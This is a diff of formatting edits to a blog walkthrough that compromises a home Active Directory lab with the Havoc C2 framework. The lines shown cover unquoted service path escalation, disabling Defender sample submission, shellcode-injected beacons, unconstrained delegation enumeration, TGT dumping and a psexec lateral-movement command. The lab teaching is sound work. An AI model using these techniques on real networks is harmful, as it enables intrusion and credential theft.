@@ -35,8 +35,7 @@ Here are some terminologies that are exclusive to an Active Directory network in
 - `Domain Users`: Clients in a specific domain. They only had limited access in the domain.
 
 ## 🎟️ Kerberoasting
-Crash course for Kerberos authentication protocol.
-{: .notice}
+>Crash course for Kerberos authentication protocol.
 
 ![image](https://user-images.githubusercontent.com/107750005/221415624-f7b2ed9c-c9a9-4ec3-ad85-7583aca1f0f0.png)
 
@@ -47,7 +46,7 @@ Crash course for Kerberos authentication protocol.
 5. The client-to-server ticket can then be used for requesting specific services in the domain.
 6. Access to services are granted by the `network resources` in the domain.
 
-A ticket-granting-ticket (TGT) acts as a universal pass for accessing all the `Network Resources` in the domain instead of providing a username and password over and over again.
+💡 *A ticket-granting-ticket (TGT) acts as a universal pass for accessing all the `Network Resources` in the domain instead of providing a username and password over and over again.*
 {: .notice--info}
 
 **Kerberos** is a crucial topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies.
@@ -113,7 +112,8 @@ In **WORKSTATION-01**, ping **DC01.havoc.local** and **WORKSTATION-02.havoc.loca
 
 **3) Ensure that the VM Network Adapters are applied correctly.**
 
-> **DC01.havoc.local** only has the static IP `10.10.101.131`.
+💡 ***DC01.havoc.local*** *only has the static IP `10.10.101.131`*.
+{: .notice--info}
 
 Use the command `ipconfig` in both workstations to verify the number of adapters added.
 
@@ -125,7 +125,8 @@ Use the command `ipconfig` in both workstations to verify the number of adapters
 
 ## 💉 Compromise AD Walkthrough
 
-> Turn off ***Automatic Sample Submission*** from the Windows Defender Security settings in all of the VMs.
+⚠️ *Turn off **Automatic Sample Submission** from the Windows Defender Security settings in all of the VMs.*
+{: .notice--warning}
 
 ![image](https://user-images.githubusercontent.com/107750005/222167859-1e1a9173-a3ea-41a2-9ad2-c8fd9029eb1f.png)
 
@@ -188,12 +189,16 @@ We can see that the paths for **ALG** and **GraphicsPerfSvc** are not quoted, bu
 
 However, **HAVOC Vulnerable Service** has spaces in the path and is also unquoted.
 
+{% capture notice-2 %}
 When Windows attempts to read the path to this executable, it interprets the space as a terminator. As a result, it will attempt to execute the following (in order):
 
 1. `C:\Program.exe`
 2. `C:\Program Files\HAVOC\binary.exe`
 3. `C:\Program Files\HAVOC\binary files\executable.exe`
 4. `C:\Program Files\HAVOC\binary files\executable files\Program.exe`
+{% endcapture %}
+
+<div class="notice--primary">{{ notice-2 | markdownify }}</div>
 
 If we can drop a binary into any of these directories, the service will execute it before the real one. Of course, there's no guarantee that we have permissions to write into either of them.
 
@@ -345,7 +350,8 @@ At this point, the first flag can be retrieved. Here is a video walkthrough cove
 
 {% include video id="TyFHmhjm5ig" provider="youtube" %}
 
-> In the video, you might that an extra beacon is spawned in using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.
+💡 *In the video, you might that an extra beacon is spawned in using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.*
+{: .notice--info}
 
 ### 💠 Kerberos
 Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.
@@ -400,7 +406,8 @@ GitHub: @tomcarver16
 	[+] operatingsystem : Windows 11 Pro
 ```
 
-> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation of searching for unconstrained delegation objects.
+💡 *The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation of searching for unconstrained delegation objects.*
+{: .notice--info}
 
 [`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has pretty much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
 
@@ -476,7 +483,8 @@ Action: Triage Kerberos Tickets (All Users)
  | 0x1eda980 | m.seitz @ HAVOC.LOCAL         | ldap/DC01.havoc.local             | 6/3/2023 7:02:06 AM  |
 ```
 
-> **WORKSTATION-01** is configured specifically so that `m.seitz` will always have an active logon session on the computer. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` does not exists for you.
+💡 ***WORKSTATION-01** is configured specifically so that `m.seitz` will always have an active logon session on the computer. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` does not exists for you.*
+{: .notice--info}
 
 As mentioned above, we want high-values domain users such as `m.seitz`, or Domain Admins to move laterally into **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump the TGTs.
 
@@ -630,7 +638,8 @@ Create another listener with SMB protocol selected and generate a new service bi
 
 The `jump-exec psexec` command work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Similar as Cobalt Strike, Demons executed using this method will always return a demon callback under the context of `SYSTEM` instead of user accounts due to the involvement of Service Control Manager. After launching the command, Havoc will start the service executable automatically in the remote target.
 
-> Take note that, the `[Service Name]` from the `jump-exec psexec` command must be **DemonSvc** when generating the service binary, as it is the default name. Additionally, do not change the default name of the service binary as it might not work for some unknown reasons.
+📓 *Take note that, the `[Service Name]` from the `jump-exec psexec` command must be **DemonSvc** when generating the service binary, as it is the default name. Additionally, do not change the default name of the service binary as it might not work for some unknown reasons.*
+{: .notice--primary}
 
 ```
 05/03/2023 23:20:57 [5pider] Demon » jump-exec psexec WORKSTATION-02 DemonSvc /home/havoc/Desktop/Payloads/demon_svc.exe
